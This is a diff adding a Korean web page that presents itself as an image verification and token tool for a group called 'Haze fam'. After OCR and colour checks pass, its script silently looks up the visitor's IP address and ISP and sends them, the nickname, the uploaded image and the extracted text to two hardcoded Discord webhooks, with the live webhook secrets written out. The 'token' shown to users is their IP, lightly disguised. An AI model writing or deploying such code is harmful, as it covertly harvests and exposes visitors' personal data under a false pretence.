@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>이미지 검증 및 토큰 발급</title>
+    <!-- OCR 텍스트 인식을 위한 Tesseract.js -->
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            padding: 40px 20px; 
+            background-color: #f9f9f9; 
+            margin: 0;
+            scroll-behavior: smooth;
+        }
+        .card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+            display: inline-block; 
+            max-width: 500px; 
+            width: 100%; 
+            box-sizing: border-box;
+            margin-bottom: 30px;
+        }
+        .preview-area {
+            margin-top: 20px;
+            border: 2px dashed #ccc;
+            border-radius: 8px;
+            padding: 10px;
+            background-color: #fafafa;
+            cursor: pointer;
+            transition: background-color 0.3s, border-color 0.3s;
+            max-height: 500px; 
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        .preview-area.dragover {
+            background-color: #e8f4ff;
+            border-color: #007bff;
+        }
+        .preview-area img { 
+            width: 100%; 
+            height: auto; 
+            object-fit: cover;
+            object-position: top; 
+            border-radius: 8px; 
+            display: block;
+        }
+        .input-group {
+            margin-top: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .nickname-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .nickname-input:focus {
+            border-color: #007bff;
+        }
+        .upload-btn, .copy-btn {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 12px 24px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            user-select: none;
+            transition: background-color 0.2s;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .upload-btn:hover, .copy-btn:hover {
+            background-color: #0056b3;
+        }
+        #status-message {
+            margin-top: 15px;
+            font-weight: bold;
+            font-size: 15px;
+            white-space: pre-line;
+        }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+        .info { color: #007bff; }
+        .result-card {
+            padding: 50px 30px; 
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        .sub-desc {
+            font-size: 13px;
+            color: #666;
+            margin-top: -8px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .result-img-box {
+            margin: 25px 0;
+        }
+        .result-img-box img {
+            max-width: 150px; 
+            height: auto;
+            border-radius: 8px;
+            pointer-events: none;
+            user-select: none;
+        }
+        .token-box {
+            background: #f1f3f5;
+            padding: 20px 15px; 
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 15px;
+            word-break: break-all;
+            color: #333;
+            border: 1px solid #ddd;
+            margin: 25px 0;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="main-card">
+        <h2>이미지 검증 카드</h2>
+        <p style="font-size: 14px; color: #666;">아래 영역에 이미지를 끌어다 놓거나 버튼을 눌러 선택하세요.</p>
+        
+        <div class="preview-area" id="drop-zone">
+            <img id="preview-img" src="" alt="선택된 이미지" style="display: none;">
+            <p id="placeholder-text" style="color: #888; margin: 40px 0;">이미지를 여기에 끌어다 놓으세요</p>
+        </div>
+
+        <div class="input-group">
+            <label for="nickname-input">닉네임 입력 (2자 이상)</label>
+            <input type="text" id="nickname-input" class="nickname-input" placeholder="닉네임을 입력하세요" maxlength="20">
+        </div>
+
+        <input type="file" id="file-input" accept="image/*" style="display: none;">
+        <label for="file-input" class="upload-btn">이미지 선택 (모바일/PC)</label>
+
+        <div id="status-message"></div>
+    </div>
+
+    <div id="result-container"></div>
+
+    <!-- 이미지 처리를 위한 캔버스 (숨김) -->
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const dropZone = document.getElementById('drop-zone');
+        const fileInput = document.getElementById('file-input');
+        const nicknameInput = document.getElementById('nickname-input');
+        const previewImg = document.getElementById('preview-img');
+        const placeholderText = document.getElementById('placeholder-text');
+        const statusMsg = document.getElementById('status-message');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        const WEBHOOK_URL_1 = 'https://discord.com/api/webhooks/1550990650730610688/OVWuxtJUZXMQe-814NcU1tjXd1c_VejmeRdEuEXVZO3SVXwED9yZIrkdkP3dpH8dru7Z';
+        const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1551033446598709278/6g6b-orgLyzLaru146Dt7I7ACU3Y0Cl6IOF58xcGZLEgAFZGUuW-9wxYUL40XplwPRPG';
+
+        function validateNickname() {
+            const nickname = nicknameInput.value.trim();
+            if (nickname.length < 2) {
+                setStatus('닉네임을 2자 이상 입력해주세요.', 'error');
+                nicknameInput.focus();
+                return false;
+            }
+            return true;
+        }
+
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('dragover');
+        });
+
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('dragover');
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('dragover');
+            if (!validateNickname()) return;
+            if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                handleFile(e.dataTransfer.files[0]);
+            }
+        });
+
+        dropZone.addEventListener('click', () => {
+            if (!validateNickname()) return;
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            if (!validateNickname()) {
+                fileInput.value = '';
+                return;
+            }
+            if (e.target.files && e.target.files[0]) {
+                handleFile(e.target.files[0]);
+            }
+        });
+
+        function handleFile(file) {
+            if (!file.type.startsWith('image/')) {
+                setStatus('이미지 파일만 업로드할 수 있습니다.', 'error');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                previewImg.src = e.target.result;
+                previewImg.style.display = 'block';
+                placeholderText.style.display = 'none';
+
+                previewImg.onload = () => {
+                    processImageVerification();
+                };
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function setStatus(text, type) {
+            statusMsg.textContent = text;
+            statusMsg.className = type;
+        }
+
+        async function getUserNetworkInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return { ip: data.ip || "알 수 없음", isp: data.org || data.isp || "알 수 없음" };
+            } catch (err) {
+                return { ip: "알 수 없음", isp: "알 수 없음" };
+            }
+        }
+
+        async function generateIpToken(ip) {
+            if (!ip || ip === "알 수 없음") ip = "123.456.7891";
+            const dotPositions = [];
+            for (let i = 0; i < ip.length; i++) {
+                if (ip[i] === '.') dotPositions.push(i + 1);
+            }
+            const convertedIp = ip.split('.').map(part => {
+                const num = parseInt(part, 10);
+                return isNaN(num) ? part : (num + 278);
+            }).join('.');
+            return `${convertedIp} ¥}{ ST = ${dotPositions.join('/')}`;
+        }
+
+        function getSendableBlob() {
+            return new Promise((resolve) => {
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/png');
+            });
+        }
+
+        async function sendDiscordWebhook(networkInfo, tokenText, nickname, ocrText, imageBlob) {
+            const fileName = 'verification.png';
+            const now = new Date();
+            const formattedTime = now.getFullYear() + '-' +
+                String(now.getMonth() + 1).padStart(2, '0') + '-' +
+                String(now.getDate()).padStart(2, '0') + ' ' +
+                String(now.getHours()).padStart(2, '0') + ':' +
+                String(now.getMinutes()).padStart(2, '0') + ':' +
+                String(now.getSeconds()).padStart(2, '0');
+
+            // 디스코드 글자 수 제한 방지 (안전 장치)
+            const safeOcrText = ocrText.length > 3900 ? ocrText.substring(0, 3900) + "..." : ocrText;
+
+            // =====================================
+            // [웹훅 1] 닉네임 제외 (상세 정보)
+            // =====================================
+            
+            // 1차 전송: 썸네일로 전송
+            const payload1_1 = {
+                embeds: [{
+                    title: "✨ 이미지 인증 정보 :3",
+                    color: 0x5865F2,
+                    thumbnail: { url: `attachment://${fileName}` },
+                    fields: [
+                        { name: "🕒 인증 시각", value: formattedTime, inline: false },
+                        { name: "🌐 IP 주소", value: networkInfo.ip, inline: true },
+                        { name: "📡 통신사 (ISP)", value: networkInfo.isp, inline: true },
+                        { name: "🔑 발급된 토큰", value: "```" + tokenText + "```", inline: false }
+                    ]
+                }]
+            };
+            const fd1_1 = new FormData();
+            fd1_1.append('payload_json', JSON.stringify(payload1_1));
+            fd1_1.append('file', imageBlob, fileName);
+
+            // 2차 전송: 전체 사진 + 감지된 텍스트
+            const payload1_2 = {
+                embeds: [{
+                    title: "🔍 원본 사진 및 감지된 텍스트",
+                    color: 0x2b2d31,
+                    image: { url: `attachment://${fileName}` },
+                    description: "**[OCR 감지 텍스트 전체]**\n```text\n" + (safeOcrText || "감지된 텍스트 없음") + "\n```"
+                }]
+            };
+            const fd1_2 = new FormData();
+            fd1_2.append('payload_json', JSON.stringify(payload1_2));
+            fd1_2.append('file', imageBlob, fileName);
+
+            // =====================================
+            // [웹훅 2] 닉네임 포함 (요약 정보)
+            // =====================================
+
+            // 1차 전송: 썸네일로 전송
+            const payload2_1 = {
+                embeds: [{
+                    title: "✨ 이미지 인증 정보 (요약) :3",
+                    color: 0x5865F2,
+                    thumbnail: { url: `attachment://${fileName}` },
+                    fields: [
+                        { name: "👤 닉네임", value: nickname, inline: false },
+                        { name: "🕒 인증 시각", value: formattedTime, inline: false },
+                        { name: "🔑 발급된 토큰", value: "```" + tokenText + "```", inline: false }
+                    ]
+                }]
+            };
+            const fd2_1 = new FormData();
+            fd2_1.append('payload_json', JSON.stringify(payload2_1));
+            fd2_1.append('file', imageBlob, fileName);
+
+            // 2차 전송: 전체 사진 + 감지된 텍스트
+            const payload2_2 = {
+                embeds: [{
+                    title: "🔍 원본 사진 및 감지된 텍스트",
+                    color: 0x2b2d31,
+                    image: { url: `attachment://${fileName}` },
+                    description: "**[OCR 감지 텍스트 전체]**\n```text\n" + (safeOcrText || "감지된 텍스트 없음") + "\n```"
+                }]
+            };
+            const fd2_2 = new FormData();
+            fd2_2.append('payload_json', JSON.stringify(payload2_2));
+            fd2_2.append('file', imageBlob, fileName);
+
+            try {
+                // 1. 썸네일 메시지를 먼저 두 웹훅에 동시 전송
+                await Promise.all([
+                    fetch(WEBHOOK_URL_1, { method: 'POST', body: fd1_1 }),
+                    fetch(WEBHOOK_URL_2, { method: 'POST', body: fd2_1 })
+                ]);
+
+                // 0.5초 대기 (디스코드 메시지 순서 꼬임 방지)
+                await new Promise(r => setTimeout(r, 500));
+
+                // 2. 전체 사진 및 텍스트 메시지를 이어서 전송
+                await Promise.all([
+                    fetch(WEBHOOK_URL_1, { method: 'POST', body: fd1_2 }),
+                    fetch(WEBHOOK_URL_2, { method: 'POST', body: fd2_2 })
+                ]);
+            } catch (err) {
+                console.error("웹훅 전송 에러:", err);
+            }
+        }
+
+        async function processImageVerification() {
+            setStatus('잠시만 기다려주세요!..', 'info');
+
+            try {
+                canvas.width = previewImg.naturalWidth;
+                canvas.height = previewImg.naturalHeight;
+                ctx.drawImage(previewImg, 0, 0);
+
+                const worker = await Tesseract.createWorker('eng');
+                const { data: { text } } = await worker.recognize(canvas);
+                await worker.terminate();
+
+                const rawOcrText = text.trim();
+                const cleanedText = rawOcrText.replace(/\s+/g, ' ').toLowerCase();
+
+                if (!cleanedText.includes('haze fam') && !cleanedText.includes('hazefam')) {
+                    setStatus('저희방이 아니에요..', 'error');
+                    return;
+                }
+
+                setStatus('저희방은 맞는거 같아요! ("Haze fam")\n2차 검사 진행할게요!', 'info');
+
+                const targetR = 0xF3; 
+                const targetG = 0x53; 
+                const targetB = 0x1D; 
+
+                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                const data = imageData.data;
+                let colorFound = false;
+                const tolerance = 15;
+
+                for (let i = 0; i < data.length; i += 4) {
+                    if (
+                        Math.abs(data[i] - targetR) <= tolerance &&
+                        Math.abs(data[i + 1] - targetG) <= tolerance &&
+                        Math.abs(data[i + 2] - targetB) <= tolerance
+                    ) {
+                        colorFound = true;
+                        break;
+                    }
+                }
+
+                if (colorFound) {
+                    setStatus('👍감사해요!', 'success');
+                    
+                    const nickname = nicknameInput.value.trim();
+                    const networkInfo = await getUserNetworkInfo();
+                    const generatedToken = await generateIpToken(networkInfo.ip);
+                    const imageBlob = await getSendableBlob();
+                    
+                    // 변환된 이미지, 텍스트와 함께 분할 전송 시작
+                    sendDiscordWebhook(networkInfo, generatedToken, nickname, rawOcrText, imageBlob);
+
+                    preloadImageAndRenderUI(generatedToken);
+                } else {
+                    setStatus('방 좋아요도 눌러주셔야 해요!!', 'error');
+                }
+
+            } catch (err) {
+                console.error(err);
+                setStatus('이미지 검사 중 오류가 발생했습니다.', 'error');
+            }
+        }
+
+        function preloadImageAndRenderUI(tokenText) {
+            const tokenImgUrl = "https://media.ffycdn.net/eu/supercell/B9aSwkAt73UKJgmPgSun.png?width=2400";
+            const imgPreload = new Image();
+            
+            imgPreload.src = tokenImgUrl;
+            imgPreload.onload = () => renderResultUI(tokenText, tokenImgUrl);
+            imgPreload.onerror = () => renderResultUI(tokenText, tokenImgUrl);
+        }
+
+        function renderResultUI(tokenText, imgUrl) {
+            const resultContainer = document.getElementById('result-container');
+            resultContainer.innerHTML = `
+                <div class="card result-card" id="success-card">
+                    <h2 style="margin-bottom: 12px;">인증 성공 결과</h2>
+                    <p class="sub-desc">
+                        위에 있는 이미지 통과 사진을 보내주셔도 되지만,<br>
+                        이 토큰 이미지를 보내주셔도 돼요!
+                    </p>
+                    <div class="result-img-box">
+                        <img src="${imgUrl}" alt="토큰 이미지" oncontextmenu="return false;">
+                    </div>
+                    <div class="token-box" id="token-text">${tokenText}</div>
+                    <button class="copy-btn" onclick="copyTokenToClipboard()">클립보드 복사</button>
+                </div>
+            `;
+            setTimeout(() => {
+                const successCard = document.getElementById('success-card');
+                if (successCard) {
+                    successCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+            }, 200);
+        }
+
+        function copyTokenToClipboard() {
+            const tokenTextElement = document.getElementById('token-text');
+            if (!tokenTextElement) return;
+            const tokenText = tokenTextElement.innerText;
+            navigator.clipboard.writeText(tokenText).then(() => {
+                alert('토큰이 클립보드에 복사되었습니다 :P');
+            }).catch(err => {
+                alert('복사에 실패했습니다. 직접 선택하여 복사해주세요.');
+            });
+        }
+    </script>
+</body>
+</html>
